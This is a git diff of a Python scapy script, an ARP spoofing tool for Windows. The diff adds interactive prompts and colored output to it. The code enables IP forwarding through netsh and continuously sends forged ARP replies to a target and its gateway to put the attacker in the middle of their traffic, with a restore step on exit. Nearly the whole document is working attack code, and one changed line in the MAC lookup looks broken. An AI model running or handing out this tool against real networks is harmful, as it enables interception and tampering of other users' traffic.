@@ -5,17 +5,18 @@ from scapy.all import ARP, Ether, sendp, srp
 import sys
 from colorama import init, Fore, Style
 import pyfiglet
+from colored_txt import ctxt, rtxt, ytxt, back_color, lmtxt, gtxt, btxt
 
 # Initialize colorama
 init()
+data = {}
 
 def display_banner():
-    banner_text = "ARP Spoofing Tool"
+    banner_text = "ARP Spoofer"
     styled_banner = pyfiglet.figlet_format(banner_text, font="slant")
-    print(Fore.RED + styled_banner)
-    print(Fore.YELLOW + "="*60)
-    print(Fore.CYAN + "Advanced ARP Cache Poisoning Tool for Windows")
-    print(Fore.YELLOW + "="*60 + Style.RESET_ALL)
+    rtxt(styled_banner)
+    back_color("Github : 0xAbolfazl\n".center(20, " "))
+    btxt("="*60)
     print()
 
 def get_arguments():
@@ -26,20 +27,41 @@ def get_arguments():
     parser.add_argument('-s', '--speed', dest='speed', type=int, default=2, 
                         help='Attack speed (seconds between packets, default: 2)')
     options = parser.parse_args()
-    
-    if not all([options.target, options.gateway, options.interface]):
-        parser.error(Fore.RED + "[-] Please specify all required arguments. Use -h for help." + Style.RESET_ALL)
-    
-    return options
+
+
+    if options.target:
+        data['target'] = options.target
+    else:
+        ctxt('[?]    Enter Target IP : ', end='')
+        data['target'] = input()
+
+    if options.gateway:
+        data['gateway'] = options.gateway
+    else:
+        ctxt('[?]    Enter Gateway IP : ', end='')
+        data['gateway'] = input()
+
+    if options.interface:
+        data['interface'] = options.interface
+    else:
+        ctxt('[?]    Enter Interface  : ', end='')
+        data['interface'] = input()
+
+    if options.speed:
+        data['speed'] = options.speed
+    else:
+        ctxt('[?]    Enter Speed : ', end='')
+        data['speed'] = input()
 
 def enable_ip_forwarding():
     """Enable IP forwarding on Windows"""
     try:
-        os.system('netsh interface ipv4 set interface "' + args.interface + '" forwarding=enabled')
-        print(Fore.GREEN + "[+] IP forwarding enabled" + Style.RESET_ALL)
+        gtxt('[!]    Enablling IP Forwarding ...')
+        os.system('netsh interface ipv4 set interface "' + data['interface'] + '" forwarding=enabled')
+        gtxt("[+]    IP Forwarding Enabled !")
     except Exception as e:
-        print(Fore.RED + f"[-] Error enabling IP forwarding: {e}" + Style.RESET_ALL)
-        print(Fore.RED + "[-] Please run as Administrator" + Style.RESET_ALL)
+        rtxt(f"[!]    Error enabling IP forwarding: {e}")
+        rtxt("[!]    Please run as Administrator")
         sys.exit(1)
 
 def get_mac(ip):
@@ -47,81 +69,75 @@ def get_mac(ip):
     try:
         ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
         if ans:
-            return ans[0][1].src
+            return ans[0][0][1].hwsrc
     except Exception as e:
-        print(Fore.RED + f"[-] Error getting MAC address: {e}" + Style.RESET_ALL)
+        rtxt(f"[!]    Error getting MAC address: {e}")
     return None
 
-def spoof(target_ip, target_mac, gateway_ip, gateway_mac):
+def spoof(target_ip, target_mac, gateway_ip):
     """Send ARP spoofing packets"""
     try:
-        # Tell target we're the gateway
         sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=0)
-        # Tell gateway we're the target
-        sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=0)
     except Exception as e:
-        print(Fore.RED + f"[-] Error sending spoof packets: {e}" + Style.RESET_ALL)
+        print(Fore.RED + f"[!]    Error sending spoof packets: {e}")
 
 def restore(target_ip, target_mac, gateway_ip, gateway_mac):
     """Restore ARP tables to correct values"""
     try:
         sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5, verbose=0)
         sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5, verbose=0)
-        print(Fore.GREEN + "[+] ARP tables restored" + Style.RESET_ALL)
+        gtxt("[+]    ARP tables restored")
     except Exception as e:
-        print(Fore.RED + f"[-] Error restoring ARP tables: {e}" + Style.RESET_ALL)
+        rtxt(f"[-]    Error restoring ARP tables: {e}")
 
 def main():
     display_banner()
-    
-    try:
-        global args
-        args = get_arguments()
-        
+    get_arguments()
+
+    try:  
         # Check for admin privileges
         try:
             with open(os.path.join(os.getenv("TEMP"), "arp_test.txt"), "w") as f:
                 f.write("test")
             os.remove(os.path.join(os.getenv("TEMP"), "arp_test.txt"))
         except:
-            print(Fore.RED + "[-] Please run as Administrator" + Style.RESET_ALL)
+            rtxt("[-]    Please run as Administrator")
             sys.exit(1)
         
-        print(Fore.GREEN + "[+] Enabling IP forwarding..." + Style.RESET_ALL)
         enable_ip_forwarding()
         
-        print(Fore.GREEN + "[+] Getting MAC addresses..." + Style.RESET_ALL)
-        target_mac = get_mac(args.target)
-        gateway_mac = get_mac(args.gateway)
+        gtxt("[+]    Getting MAC addresses...")
+        target_mac = get_mac(data['target'])
+        gateway_mac = get_mac(data['gateway'])
         
         if not target_mac:
-            print(Fore.RED + f"[-] Could not get target MAC address for {args.target}" + Style.RESET_ALL)
+            rtxt(f"[-]    Could not get target MAC address for {data['target']}")
         if not gateway_mac:
-            print(Fore.RED + f"[-] Could not get gateway MAC address for {args.gateway}" + Style.RESET_ALL)
+            rtxt(f"[-]    Could not get gateway MAC address for {data['gateway']}")
         if not target_mac or not gateway_mac:
             sys.exit(1)
             
-        print(Fore.YELLOW + f"[+] Target IP: {args.target} | MAC: {target_mac}" + Style.RESET_ALL)
-        print(Fore.YELLOW + f"[+] Gateway IP: {args.gateway} | MAC: {gateway_mac}" + Style.RESET_ALL)
+        ytxt(f"[+]    Target IP: {data['target']} | MAC: {target_mac}")
+        ytxt(f"[+]    Gateway IP: {data['gateway']} | MAC: {gateway_mac}")
         
-        print(Fore.RED + "\n[+] Starting ARP spoofing attack. Press Ctrl+C to stop..." + Style.RESET_ALL)
+        rtxt("\n[+]    Starting ARP spoofing attack. Press Ctrl+C to stop...")
         
         sent_packets = 0
         try:
             while True:
-                spoof(args.target, target_mac, args.gateway, gateway_mac)
-                spoof(args.gateway, gateway_mac, args.target, target_mac)
+                spoof(data['target'], target_mac, data['gateway'])
+                spoof(data['gateway'], gateway_mac, data['target'])
                 sent_packets += 2
-                print(Fore.BLUE + f"\r[+] Packets sent: {sent_packets}", end="" + Style.RESET_ALL)
+                ctxt(f"\r[+]    Packets sent: {sent_packets}", end="")
                 sys.stdout.flush()
-                time.sleep(args.speed)
+                time.sleep(data['speed'])
         except KeyboardInterrupt:
-            print(Fore.YELLOW + "\n[+] Detected CTRL+C. Restoring ARP tables..." + Style.RESET_ALL)
-            restore(args.target, target_mac, args.gateway, gateway_mac)
-            print(Fore.GREEN + "[+] ARP spoofing attack stopped." + Style.RESET_ALL)
+            ytxt("\n[+]    Detected CTRL+C. Restoring ARP tables...")
+            restore(data['target'], target_mac, data['gateway'], gateway_mac)
+            ytxt("[+]    ARP spoofing attack stopped.")
             
     except Exception as e:
-        print(Fore.RED + f"[-] Error: {e}" + Style.RESET_ALL)
+        rtxt( f"[!]    Error: {e}")
         sys.exit(1)
 
 if __name__ == "__main__":
